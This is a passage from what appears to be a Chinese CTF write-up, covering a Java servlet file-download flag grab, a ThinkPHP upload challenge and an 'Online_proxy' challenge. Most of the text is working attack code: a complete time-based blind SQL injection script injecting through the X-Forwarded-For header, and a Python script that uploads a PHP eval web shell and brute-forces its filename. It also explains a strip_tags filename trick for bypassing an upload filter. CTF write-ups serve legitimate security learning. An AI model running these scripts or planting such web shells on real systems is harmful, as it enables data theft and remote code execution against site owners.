class="token punctuation">.</span>FlagController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>FlagController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">></span><span class="token operator">/</span>Flag<span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">-</span>pattern<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span></code></pre><p>最后得到flag</p><pre><code>POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></pre><pre><code>flagLjava/lang/String;&lt;init&gt;()VCodeLineNumberTabledoGetR(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)VExceptions#$SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s5YjY3N2UwNC03MzM1LTQyNWEtYTMxZi1iOTVmZTc1MWFlNmR9Cg==    %&amp;&#39;&amp;&lt;h1&gt;Flag is nearby ~ Come on! !</code></pre><h2 id="Online-proxy-时间盲注"><a href="#Online-proxy-时间盲注" class="headerlink" title="Online_proxy(时间盲注)"></a>Online_proxy(时间盲注)</h2><p>脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">import</span> sysurl <span class="token operator">=</span> <span class="token string">'http://*********************.4hou.com.cn:*****/'</span><span class="token keyword">def</span> <span class="token function">rand_str</span><span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">brute_schema</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"track_uuid"</span><span class="token punctuation">:</span> <span class="token string">"ad6e17bd-1a8b-442e-f834-%s"</span> <span class="token operator">%</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> <span class="token string">"1' and if(binary(select substr(table_schema,%d,1) from information_schema.tables group by table_schema limit 4,1)>=char(%d),sleep(1),0))#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    t1 <span class="token operator">=</span> <span class="token number">0</span>    t2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> t2 <span class="token operator">-</span> t1 <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">brute_table</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"track_uuid"</span><span class="token punctuation">:</span> <span class="token string">"ad6e17bd-1a8b-442e-f834-%s"</span> <span class="token operator">%</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> "<span class="token number">1</span><span class="token string">' and if(binary(select substr(table_name,%d,1) from information_schema.tables where table_schema='</span>F4l9_D4t4B45e' limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>=</span>char<span class="token punctuation">(</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#" % (i, ord(c))}</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    t1 <span class="token operator">=</span> <span class="token number">0</span>    t2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> t2 <span class="token operator">-</span> t1 <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">brute_column</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"track_uuid"</span><span class="token punctuation">:</span> <span class="token string">"ad6e17bd-1a8b-442e-f834-%s"</span> <span class="token operator">%</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> "<span class="token number">1</span><span class="token string">' and if(binary(select substr(column_name,%d,1) from information_schema.columns where table_name='</span>F4l9_t4b1e' limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>=</span>char<span class="token punctuation">(</span><span class="token operator">%</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#" % (i, ord(c))}</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    t1 <span class="token operator">=</span> <span class="token number">0</span>    t2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> t2 <span class="token operator">-</span> t1 <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">brute_flag</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"track_uuid"</span><span class="token punctuation">:</span> <span class="token string">"ad6e17bd-1a8b-442e-f834-%s"</span> <span class="token operator">%</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> <span class="token string">"1' and if(binary(select substr(F4l9_c01umn,%d,1) from F4l9_D4t4B45e.F4l9_t4b1e limit 1,1)>=char(%d),sleep(1),0))#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    headers<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> rand_str<span class="token punctuation">(</span><span class="token punctuation">)</span>    t1 <span class="token operator">=</span> <span class="token number">0</span>    t2 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>            t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> t2 <span class="token operator">-</span> t1 <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">'''schema = ''for i in range(999):    l = 0    m = 0    r = 0xff    while True:        m = (l + r) / 2        print l, m, r        if brute_schema(i + 1, chr(m)):            if m == l:                schema += chr(l)                break            l = m        else:            if m == l:                schema += chr(l)                break            r = m    print schema'''</span><span class="token triple-quoted-string string">'''table = ''for i in range(999):    l = 0    m = 0    r = 0xff    while True:        m = (l + r) / 2        print l, m, r        if brute_table(i + 1, chr(m)):            if m == l:                table += chr(l)                break            l = m        else:            if m == l:                table += chr(l)                break            r = m    print table'''</span><span class="token triple-quoted-string string">'''column = ''for i in range(999):    l = 0    m = 0    r = 0xff    while True:        m = (l + r) / 2        print l, m, r        if brute_column(i + 1, chr(m)):            if m == l:                column += chr(l)                break            l = m        else:            if m == l:                column += chr(l)                break            r = m    print column'''</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token number">0</span>    m <span class="token operator">=</span> <span class="token number">0</span>    r <span class="token operator">=</span> <span class="token number">0xff</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>        <span class="token keyword">print</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> r        <span class="token keyword">if</span> brute_flag<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> m <span class="token operator">==</span> l<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>l<span class="token punctuation">)</span>                <span class="token keyword">break</span>            l <span class="token operator">=</span> m        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> m <span class="token operator">==</span> l<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>l<span class="token punctuation">)</span>                <span class="token keyword">break</span>            r <span class="token operator">=</span> m    <span class="token keyword">print</span> flag</code></pre><h2 id="Simple-upload-tp框架漏洞"><a href="#Simple-upload-tp框架漏洞" class="headerlink" title="Simple_upload(tp框架漏洞)"></a>Simple_upload(tp框架漏洞)</h2><p>tp框架</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 实例化上传类</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传大小</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传类型</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传目录</span>        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传子目录</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传错误提示错误信息</span>          <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传成功 获取上传文件信息</span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>测试上传功能没问题，但是源码中限制了<code>$_FILES[file]</code>文件名不能是.php文件，得想办法绕过。 </p><p>查看thinkphp3的源码，<code>ThinkPHP/Library/Think/Upload.class.php</code>就是对应<code>Upload</code>类。我们可以发现上述代码中的<code>allowExts</code>属性其实并不存在，TP3 中限制上传文件后缀类型的属性应该是<code>exts</code>。</p><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>上传类的<strong>upload()</strong> 函数不传参时为多文件上传，整个 <strong>$_FILES</strong> 数组的文件都会上传保存，而题目中只限制了 <strong>$_FILES[‘file’]</strong> 的上传后缀，也只给出<strong>$_FILES[‘file’]</strong> 上传后的路径，那我们上传<strong>$_FILES</strong>的name不为file，比如<strong>$_FILES[‘file2’]</strong>，就可以绕过 <strong>php</strong> 后缀限制。</p><p>在<code>Upload.class.php</code>的第 27 行</p><pre><code>&#39;saveName&#39; =&gt; array(&#39;uniqid&#39;, &#39;&#39;), //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组</code></pre><p>文件名是通过uniqid函数生成的，uniqid函数是基于以微秒计的当前时间计算的，可以爆破文件名。</p><p>脚本</p><pre class=" language-php"><code class="language-php">import requestssession <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span>url<span class="token operator">=</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost:8888/tp"</span>paramsMultipart <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">"123"</span><span class="token punctuation">,</span> <span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'file2'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php eval($_POST['a']);"</span><span class="token punctuation">,</span> <span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php/home/index/upload"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>paramsMultipart<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response body: %s"</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>s<span class="token operator">=</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'5db'</span><span class="token punctuation">)</span>t1<span class="token operator">=</span>response<span class="token punctuation">.</span>content<span class="token punctuation">[</span>s<span class="token punctuation">:</span>s<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">]</span>t11<span class="token operator">=</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span>t1<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>paramsMultipart <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">"123"</span><span class="token punctuation">,</span> <span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/index.php/home/index/upload"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>paramsMultipart<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response body: %s"</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>t2<span class="token operator">=</span>response<span class="token punctuation">.</span>content<span class="token punctuation">[</span>s<span class="token punctuation">:</span>s<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">]</span>t22<span class="token operator">=</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span>t2<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span>t11<span class="token punctuation">,</span>t22<span class="token punctuation">)</span><span class="token punctuation">:</span>    t2<span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> t2    url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"/Public/Uploads/2019-10-24/"</span><span class="token operator">+</span>t2<span class="token operator">+</span><span class="token string">".php"</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Response body: %s"</span> <span class="token operator">%</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>在<code>Upload.class.php</code>的第 157 行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>strip_tags()</code>函数会去除文件名中的 HTML 标签。因此我们可以构造形如<code>.p&lt;br&gt;hp</code>这样的文件后缀，从而绕过对于<code>.php</code>的检测，进入 TP3 的upload类中，它又会帮我们去除 HTML 标签。</p><pre class=" language-http"><code class="language-http">POST /index.php/home/index/upload HTTP/1.1<span class="token header-name keyword">Host:</span> 2f65d526-4167-4f89-bb36-1e748aed6d13.node3.buuoj.cn<span class="token header-name keyword">Pragma:</span> no-cache<span class="token header-name keyword">Cache-Control:</span> no-cache<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<span class="token header-name keyword">Origin:</span> http://172.21.11.222<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=----WebKitFormBoundarysVAM76Hq7GOSqE1m<span class="token header-name keyword">Accept:</span> 